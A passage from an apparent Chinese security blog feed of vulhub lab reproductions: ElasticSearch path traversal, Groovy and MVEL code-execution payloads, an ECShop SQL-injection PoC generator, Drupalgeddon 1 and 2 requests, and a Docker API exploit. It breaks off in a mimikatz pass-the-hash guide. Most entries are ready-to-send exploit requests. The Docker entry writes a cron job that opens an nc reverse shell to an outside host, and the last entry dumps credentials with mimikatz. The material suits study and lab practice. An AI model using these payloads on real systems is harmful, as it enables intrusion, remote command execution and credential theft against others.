title="目录穿越读取任意文件"></a>目录穿越读取任意文件</h3><p>访问 <code>http://your-ip:9200/_snapshot/test/backdata%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd</code></p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190608155225.png-water_print" alt=""></p><p>解码，得到：</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190608155225.png-water_print" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> vulhub </tag>
            
            <tag> ElasticSearch </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ElasticSearch 目录穿越漏洞</title>
      <link href="/2019/06/08/elasticsearch-mu-lu-chuan-yue-lou-dong/"/>
      <url>/2019/06/08/elasticsearch-mu-lu-chuan-yue-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="ElasticSearch-目录穿越漏洞（CVE-2015-3337）"><a href="#ElasticSearch-目录穿越漏洞（CVE-2015-3337）" class="headerlink" title="ElasticSearch 目录穿越漏洞（CVE-2015-3337）"></a>ElasticSearch 目录穿越漏洞（CVE-2015-3337）</h1><p>jre版本：openjdk:8-jre<br>elasticsearch版本：v1.4.4<br>影响版本：1.4.5以下/1.5.2以下</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>在安装了具有“site”功能的插件以后，插件目录使用../即可向上跳转，导致目录穿越漏洞，可读取任意文件。没有安装任意插件的elasticsearch不受影响。</p><h3 id="head插件"><a href="#head插件" class="headerlink" title="head插件"></a>head插件</h3><p>head插件提供了elasticsearch的前端页面，访问 <a href="http://your-ip:9200/" target="_blank" rel="noopener">http://your-ip:9200/</a><br>_plugin/head/ 即可看到。</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190608155225.png-water_print" alt=""></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>测试环境默认安装了一个插件：<code>elasticsearch-head</code>，主页在此：<a href="https://github.com/mobz/elasticsearch-head" target="_blank" rel="noopener">https://github.com/mobz/elasticsearch-head</a></p><p>访问<code>http://your-ip:9200/_plugin/head/../../../../../../../../../etc/passwd</code>读取任意文件（不要在浏览器访问）：</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190608155232.png-water_print" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> ElasticSearch </tag>
            
            <tag> vlhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ElasticSearch Groovy 沙盒绕过</title>
      <link href="/2019/06/08/elasticsearch-groovy-sha-he-rao-guo/"/>
      <url>/2019/06/08/elasticsearch-groovy-sha-he-rao-guo/</url>
      
        <content type="html"><![CDATA[<h1 id="ElasticSearch-Groovy-沙盒绕过-amp-amp-代码执行漏洞（CVE-2015-1427）"><a href="#ElasticSearch-Groovy-沙盒绕过-amp-amp-代码执行漏洞（CVE-2015-1427）" class="headerlink" title="ElasticSearch Groovy 沙盒绕过 &amp;&amp; 代码执行漏洞（CVE-2015-1427）"></a>ElasticSearch Groovy 沙盒绕过 &amp;&amp; 代码执行漏洞（CVE-2015-1427）</h1><p>jre版本：openjdk:8-jre<br>elasticsearch版本：v1.4.2</p><p>CVE-2014-3120后，ElasticSearch默认的动态脚本语言换成了Groovy，并增加了沙盒，但默认仍然支持直接执行动态语言。本漏洞：</p><ol><li>是一个沙盒绕过； </li><li>是一个Goovy代码执行漏洞。</li></ol><h2 id="Groovy语言“沙盒”"><a href="#Groovy语言“沙盒”" class="headerlink" title="Groovy语言“沙盒”"></a>Groovy语言“沙盒”</h2><p>ElasticSearch支持使用“在沙盒中的”Groovy语言作为动态脚本，但显然官方的工作并没有做好。lupin和tang3分别提出了两种执行命令的方法：</p><ol><li>既然对执行Java代码有沙盒，lupin的方法是想办法绕过沙盒，比如使用Java反射</li><li>Groovy原本也是一门语言，于是tang3另辟蹊径，使用Groovy语言支持的方法，来直接执行命令，无需使用Java语言</li></ol><p>所以，根据这两种执行漏洞的思路，我们可以获得两个不同的POC。</p><p>Java沙盒绕过法：</p><pre class=" language-java"><code class="language-java">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>Math<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getText</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>Goovy直接执行命令法：</p><pre class=" language-Goovy"><code class="language-Goovy">def command='id';def res=command.execute().text;res</code></pre><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>由于查询时至少要求es中有一条数据，所以发送如下数据包，增加一个数据：</p><pre class=" language-HTTP"><code class="language-HTTP">POST /website/blog/ HTTP/1.1Host: your-ip:9200Accept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 25{  "name": "test"}</code></pre><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190608154501.png-water_print" alt=""></p><p>然后发送包含payload的数据包，执行任意命令：</p><pre class=" language-HTTP"><code class="language-HTTP">POST /_search?pretty HTTP/1.1Host: your-ip:9200Accept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: application/textContent-Length: 156{"size":1, "script_fields": {"lupin":{"lang":"groovy","script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\").getText()"}}}</code></pre><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190608154510.png-water_print" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> vulhub </tag>
            
            <tag> ElasticSearch </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ElasticSearch 命令执行漏洞</title>
      <link href="/2019/06/08/elasticsearch-ming-ling-zhi-xing-lou-dong/"/>
      <url>/2019/06/08/elasticsearch-ming-ling-zhi-xing-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="ElasticSearch-命令执行漏洞（CVE-2014-3120）"><a href="#ElasticSearch-命令执行漏洞（CVE-2014-3120）" class="headerlink" title="ElasticSearch 命令执行漏洞（CVE-2014-3120）"></a>ElasticSearch 命令执行漏洞（CVE-2014-3120）</h1><p>jre版本：openjdk:8-jre<br>elasticsearch版本：v1.1.1</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>老版本ElasticSearch支持传入动态脚本（MVEL）来执行一些复杂的操作，而MVEL可执行Java代码，而且没有沙盒，所以我们可以直接执行任意代码。</p><p>MVEL执行命令的代码如下：</p><pre class=" language-MVEL"><code class="language-MVEL">import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec("id").getInputStream()).useDelimiter("\\A").next();</code></pre><h2 id="漏洞测试"><a href="#漏洞测试" class="headerlink" title="漏洞测试"></a>漏洞测试</h2><p>首先，该漏洞需要es中至少存在一条数据，所以我们需要先创建一条数据：</p><pre class=" language-HTTP"><code class="language-HTTP">POST /website/blog/ HTTP/1.1Host: your-ip:9200Accept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 25{  "name": "phithon"}</code></pre><p>然后，执行任意代码：</p><pre class=" language-HTTP"><code class="language-HTTP">POST /_search?pretty HTTP/1.1Host: your-ip:9200Accept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 343{    "size": 1,    "query": {      "filtered": {        "query": {          "match_all": {          }        }      }    },    "script_fields": {        "command": {            "script": "import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\"id\").getInputStream()).useDelimiter(\"\\\\A\").next();"        }    }}</code></pre><p>结果如图：<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190608153226.png-water_print" alt=""><br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190608153241.png-water_print" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> vulhub </tag>
            
            <tag> ElasticSearch </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ECShop SQL注入/任意代码执行漏洞</title>
      <link href="/2019/06/08/ecshop-sql-zhu-ru-ren-yi-dai-ma-zhi-xing-lou-dong/"/>
      <url>/2019/06/08/ecshop-sql-zhu-ru-ren-yi-dai-ma-zhi-xing-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="ECShop-2-x-3-x-SQL注入-任意代码执行漏洞"><a href="#ECShop-2-x-3-x-SQL注入-任意代码执行漏洞" class="headerlink" title="ECShop 2.x/3.x SQL注入/任意代码执行漏洞"></a>ECShop 2.x/3.x SQL注入/任意代码执行漏洞</h1><p>ECShop是一款B2C独立网店系统，适合企业及个人快速构建个性化网上商店。系统是基于PHP语言及MYSQL数据库构架开发的跨平台开源程序。</p><p>其2017年及以前的版本中，存在一处SQL注入漏洞，通过该漏洞可注入恶意数据，最终导致任意代码执行漏洞。其3.6.0最新版已修复该漏洞，vulhub中使用其2.7.3最新版与3.6.0次新版进行漏洞复现。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>可以生成2.x和3.x的POC的脚本：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$shell</span> <span class="token operator">=</span> <span class="token function">bin2hex</span><span class="token punctuation">(</span>"<span class="token punctuation">{</span>\<span class="token variable">$asd</span>'<span class="token punctuation">]</span><span class="token punctuation">;</span>phpinfo\<span class="token package">t</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//}xxx");</span><span class="token variable">$id</span> <span class="token operator">=</span> "<span class="token operator">-</span><span class="token number">1</span>' <span class="token constant">UNION</span><span class="token comment" spellcheck="true">/*";$arr = [    "num" => sprintf('*/</span><span class="token constant">SELECT</span> <span class="token number">1</span><span class="token punctuation">,</span>0x<span class="token operator">%</span>s<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span>0x<span class="token operator">%</span>s<span class="token punctuation">,</span><span class="token number">10</span><span class="token operator">--</span> <span class="token operator">-</span>'<span class="token punctuation">,</span> <span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$shell</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token string">"id"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$id</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$hash3</span> <span class="token operator">=</span> <span class="token string">'45ea207d7a2b68c49582d2d22adf953a'</span><span class="token punctuation">;</span><span class="token variable">$hash2</span> <span class="token operator">=</span> <span class="token string">'554fcae493e564ee0dc75bdf2ebf94ca'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"POC for ECShop 2.x: \n"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"{$hash2}ads|{$s}{$hash2}"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"\n\nPOC for ECShop 3.x: \n"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"{$hash3}ads|{$s}{$hash3}"</span><span class="token punctuation">;</span></code></pre><p>生成的POC，放在Referer里发送：</p><pre class=" language-HTTP"><code class="language-HTTP">GET /user.php?act=login HTTP/1.1Host: your-ipUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Cookie: PHPSESSID=9odrkfn7munb3vfksdhldob2d0; ECS_ID=1255e244738135e418b742b1c9a60f5486aa4559; ECS[visit_times]=1Referer: 45ea207d7a2b68c49582d2d22adf953aads|a:2:{s:3:"num";s:107:"*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b706870696e666f0928293b2f2f7d787878,10-- -";s:2:"id";s:11:"-1' UNION/*";}45ea207d7a2b68c49582d2d22adf953aConnection: closeUpgrade-Insecure-Requests: 1Cache-Control: max-age=0</code></pre><h3 id="2-x的执行结果"><a href="#2-x的执行结果" class="headerlink" title="2.x的执行结果"></a>2.x的执行结果</h3><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190608152251.png-water_print" alt=""></p><h3 id="3-x的执行结果"><a href="#3-x的执行结果" class="headerlink" title="3.x的执行结果"></a>3.x的执行结果</h3><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190608152300.png-water_print" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> vulhub </tag>
            
            <tag> ECshop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Drupal 远程代码执行漏洞</title>
      <link href="/2019/06/08/drupal-yuan-cheng-dai-ma-zhi-xing-lou-dong/"/>
      <url>/2019/06/08/drupal-yuan-cheng-dai-ma-zhi-xing-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="Drupal-Drupalgeddon-2-远程代码执行漏洞（CVE-2018-7600）"><a href="#Drupal-Drupalgeddon-2-远程代码执行漏洞（CVE-2018-7600）" class="headerlink" title="Drupal Drupalgeddon 2 远程代码执行漏洞（CVE-2018-7600）"></a>Drupal Drupalgeddon 2 远程代码执行漏洞（CVE-2018-7600）</h1><p>Drupal 是一款用量庞大的CMS，其6/7/8版本的Form API中存在一处远程代码执行漏洞。相关分析如下：</p><ul><li><a href="https://research.checkpoint.com/uncovering-drupalgeddon-2/" target="_blank" rel="noopener">https://research.checkpoint.com/uncovering-drupalgeddon-2/</a></li></ul><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>参考<a href="https://github.com/a2u/CVE-2018-7600/blob/master/exploit.py" target="_blank" rel="noopener">a2u/CVE-2018-7600</a>，我们向安装完成的drupal发送如下数据包：</p><pre class=" language-HTTP"><code class="language-HTTP">POST /user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax HTTP/1.1Host: your-ip:8080Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 103form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=id</code></pre><p>成功执行代码，这个代码最终执行了id命令：<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190608150237.png-water_print" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> vulhub </tag>
            
            <tag> Drupal </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Drupal SQL注入漏洞</title>
      <link href="/2019/06/08/drupal-sql-zhu-ru-lou-dong/"/>
      <url>/2019/06/08/drupal-sql-zhu-ru-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="Drupal-lt-7-32-“Drupalgeddon”-SQL注入漏洞（CVE-2014-3704）"><a href="#Drupal-lt-7-32-“Drupalgeddon”-SQL注入漏洞（CVE-2014-3704）" class="headerlink" title="Drupal < 7.32 “Drupalgeddon” SQL注入漏洞（CVE-2014-3704）"></a>Drupal &lt; 7.32 “Drupalgeddon” SQL注入漏洞（CVE-2014-3704）</h1><p>Drupal 是一款用量庞大的CMS，其7.0~7.31版本中存在一处无需认证的SQL漏洞。通过该漏洞，攻击者可以执行任意SQL语句，插入、修改管理员信息，甚至执行任意代码。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>该漏洞无需认证，发送如下数据包即可执行恶意SQL语句：</p><pre class=" language-HTTP"><code class="language-HTTP">POST /?q=node&destination=node HTTP/1.1Host: your-ip:8080Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 120pass=lol&form_build_id=&form_id=user_login_block&op=Log+in&name[0 or updatexml(0,concat(0xa,user()),0)%23]=bob&name[0]=a</code></pre><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190608150108.png-water_print" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> vulhub </tag>
            
            <tag> Drupal </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker daemon api 未授权访问漏洞</title>
      <link href="/2019/06/07/docker-daemon-api-wei-shou-quan-fang-wen-lou-dong/"/>
      <url>/2019/06/07/docker-daemon-api-wei-shou-quan-fang-wen-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="docker-daemon-api-未授权访问漏洞"><a href="#docker-daemon-api-未授权访问漏洞" class="headerlink" title="docker daemon api 未授权访问漏洞"></a>docker daemon api 未授权访问漏洞</h1><h2 id="漏洞介绍："><a href="#漏洞介绍：" class="headerlink" title="漏洞介绍："></a>漏洞介绍：</h2><p>该未授权访问漏洞是因为docker remote api可以执行docker命令，从官方文档可以看出，该接口是目的是取代docker 命令界面，通过url操作docker。</p><p>docker swarm是docker下的分布化应用的本地集群，在开放2375监听集群容器时，会调用这个api</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190607180139.png-water_print" alt=""><br>url输入ip:2375/version就会列出基本信息，和docker version命令效果一样。</p><p>同样，url为ip:2375/v1.23/containers/json会列出容器信息，和docker ps -a效果一样。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>利用方法是，我们随意启动一个容器，并将宿主机的/etc目录挂载到容器中，便可以任意读写文件了。我们可以将命令写入crontab配置文件，进行反弹shell。</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> dockerclient <span class="token operator">=</span> docker<span class="token punctuation">.</span>DockerClient<span class="token punctuation">(</span>base_url<span class="token operator">=</span><span class="token string">'http://your-ip:2375/'</span><span class="token punctuation">)</span>data <span class="token operator">=</span> client<span class="token punctuation">.</span>containers<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string">'alpine:latest'</span><span class="token punctuation">,</span> r<span class="token triple-quoted-string string">'''sh -c "echo '* * * * * /usr/bin/nc your-ip 21 -e /bin/sh' >> /tmp/etc/crontabs/root" '''</span><span class="token punctuation">,</span> remove<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> volumes<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'/etc'</span><span class="token punctuation">:</span> <span class="token punctuation">{</span><span class="token string">'bind'</span><span class="token punctuation">:</span> <span class="token string">'/tmp/etc'</span><span class="token punctuation">,</span> <span class="token string">'mode'</span><span class="token punctuation">:</span> <span class="token string">'rw'</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190607180148.png-water_print" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> vulhub </tag>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DNS域传送漏洞</title>
      <link href="/2019/06/07/dns-yu-chuan-song-lou-dong/"/>
      <url>/2019/06/07/dns-yu-chuan-song-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="DNS域传送漏洞"><a href="#DNS域传送漏洞" class="headerlink" title="DNS域传送漏洞"></a>DNS域传送漏洞</h1><p>DNS协议支持使用axfr类型的记录进行区域传送，用来解决主从同步的问题。如果管理员在配置DNS服务器的时候没有限制允许获取记录的来源，将会导致DNS域传送漏洞。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>在Linux下，我们可以使用dig命令来发送dns请求。比如，我们可以用<code>dig @your-ip www.vulhub.org</code>获取域名<code>www.vulhub.org</code>在目标dns服务器上的A记录：<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190607173721.png-water_print" alt=""></p><p>发送axfr类型的dns请求：<code>dig @your-ip -t axfr vulhub.org</code></p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190607173745.png-water_print" alt=""></p><p>可见，我获取到了<code>vulhub.org</code>的所有子域名记录，这里存在DNS域传送漏洞。</p><p>我们也可以用nmap script来扫描该漏洞：<code>nmap --script dns-zone-transfer.nse --script-args "dns-zone-transfer.domain=vulhub.org" -Pn -p 53 your-ip</code></p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190607173753.png-water_print" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> vulhub </tag>
            
            <tag> DNS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Django 任意URL跳转漏洞</title>
      <link href="/2019/06/07/django-ren-yi-url-tiao-zhuan-lou-dong/"/>
      <url>/2019/06/07/django-ren-yi-url-tiao-zhuan-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="Django-lt-2-0-8-任意URL跳转漏洞（CVE-2018-14574）"><a href="#Django-lt-2-0-8-任意URL跳转漏洞（CVE-2018-14574）" class="headerlink" title="Django < 2.0.8 任意URL跳转漏洞（CVE-2018-14574）"></a>Django &lt; 2.0.8 任意URL跳转漏洞（CVE-2018-14574）</h1><p>Django默认配置下，如果匹配上的URL路由中最后一位是/，而用户访问的时候没加/，Django默认会跳转到带/的请求中。（由配置项中的<code>django.middleware.common.CommonMiddleware</code>、<code>APPEND_SLASH</code>来决定）。</p><p>在path开头为<code>//example.com</code>的情况下，Django没做处理，导致浏览器认为目的地址是绝对路径，最终造成任意URL跳转漏洞。</p><p>该漏洞利用条件是目标URLCONF中存在能匹配上<code>//example.com</code>的规则。<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190607172023.png-water_print" alt="结果"></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> vulhub </tag>
            
            <tag> Django </tag>
            
            <tag> CVE-2018-14574 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PTH(Pass The Hash) 攻击分析</title>
      <link href="/2019/04/29/pth-pass-the-hash-gong-ji/"/>
      <url>/2019/04/29/pth-pass-the-hash-gong-ji/</url>
      
        <content type="html"><![CDATA[<h1 id="PTH-Pass-The-Hash-攻击"><a href="#PTH-Pass-The-Hash-攻击" class="headerlink" title="PTH(Pass The Hash) 攻击"></a>PTH(Pass The Hash) 攻击</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>获取一台主机的本地管理员组成员账号的口令 <code>NTLM</code> 后，不需破解获取口令明文，使用 <code>PTH</code> 方式，将管理员账号及 <code>NTLM</code> 注入当前会话作为凭据，利用该凭证可以渗透获取周围主机的管理权限</p><p>对方主机需存在相同的账号，且是管理员组成员</p><p>在 <code>Windows NT 5.x</code> 系统中，管理员组账号的网络登录均能获取系统管理权</p><p>在 <code>Windows NT 6.x</code> 系统及更高的版本中，管理员组(<code>SID</code>非<code>500</code>)账号的网络登录不能获取系统管理权限，<code>administrator</code>(SID为500)账号的网络登录能获取系统管理权</p><p>这类攻击适用于：</p><ul><li><p>域/工作组环境</p></li><li><p>可以获得 hash，但是条件不允许对 hash 爆破</p></li><li><p>内网中存在和当前机器相同的密码</p></li></ul><h2 id="UAC"><a href="#UAC" class="headerlink" title="UAC"></a>UAC</h2><p>用户帐户控制 (<code>User Account Control</code>) 是 <code>Windows Vista</code>（及更高版本操作系统）中一组新的基础结构技术，可以帮助阻止恶意程序（有时也称为”恶意软件”）损坏系统，同时也可以帮助组织部署更易于管理的平台。<br>使用 <code>UAC</code>，应用程序和任务总是在非管理员帐户的安全上下文中运行，但管理员专门给系统授予管理员级别的访问权限时除外。<code>UAC</code> 会阻止未经授权应用程序的自动安装，防止无意中对系统设置进行更改。</p><p>用户帐户控制(<code>UAC</code>)是新版 <code>Windows</code> 的核心安全功能，也是其最常被人误解的众多安全功能当中的一种。</p><h2 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h2><p><code>mimikatz</code> 的 <code>pth</code> 功能需要本地管理员权限，这是由它的实现机制决定的，需要先获得高权限进程 <code>lsass.exe</code> 的信息</p><p>对于 <code>8.1/2012r2</code>，安装补丁<code>KB2871997</code> 的 <code>Win 7/2008r2/8/2012</code>，可以使用 <code>AES keys</code> 代替 <code>NT hash</code></p><p>使用 <code>mimikatz</code> 先获取 <code>hash</code>:</p><pre class=" language-cmd"><code class="language-cmd">privilege::debugsekurlsa::logonpasswords</code></pre><p>得到 hash 后</p><h3 id="工作组"><a href="#工作组" class="headerlink" title="工作组"></a>工作组</h3><pre class=" language-cmd"><code class="language-cmd">sekurlsa::pth /user:administrator /domain:workgroup 